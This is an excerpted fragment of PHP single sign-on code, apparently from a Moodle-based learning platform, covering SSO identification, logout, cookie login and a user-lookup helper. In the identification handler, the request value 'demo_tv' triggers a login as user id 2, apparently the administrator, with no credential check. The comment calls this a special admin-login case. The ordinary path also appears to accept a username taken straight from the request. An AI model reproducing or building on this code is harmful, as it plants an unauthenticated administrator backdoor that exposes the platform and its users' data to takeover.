...
if ($action == "sso.onidentification") {
    $out = 0;
    $eIdentifier = optional_param('eIdentifier', '', PARAM_TEXT);
    // TH dacbiet dang nhap admin he thong lms = tai khoan demo_tv
    if ($eIdentifier == 'demo_tv') {
        //		$ad = $DB->get_record('user',['username'=>'admin']);
        if (!isloggedin()) {
            cus_login(2);
            $out = 1;
        } else {
    ...
    // TH bthuong
    $user = $DB->get_record('user', ['username' => $eIdentifier]);
    if (empty($user)) {
        if (!isloggedin()) {
            $out = 0;
        } else {
...
if ($action == "sso.logout") {
    if (isloggedin()) {
        $user = $DB->get_record('user', ['id' => $USER->id]);
        if (!empty($user) && $user->username == 'survey') {
            echo 0;
            exit;
        }
...
if ($frm and isset($frm->username)) {                             // Login WITH cookies
    ...
    if ($user) {
        ...
        } elseif (empty($CFG->rememberusername) or ($CFG->rememberusername == 2 and empty($frm->rememberusername))) {
...
{
    global $SESSION, $DB;
    $arr = ['id', 'username', 'idnumber', 'email'];
    foreach ($arr as $key) {
        $u = $DB->get_record('user', [$key => $idorusername]);
        if (!empty($u)) {
            $id = $u->id;
            break;
        }
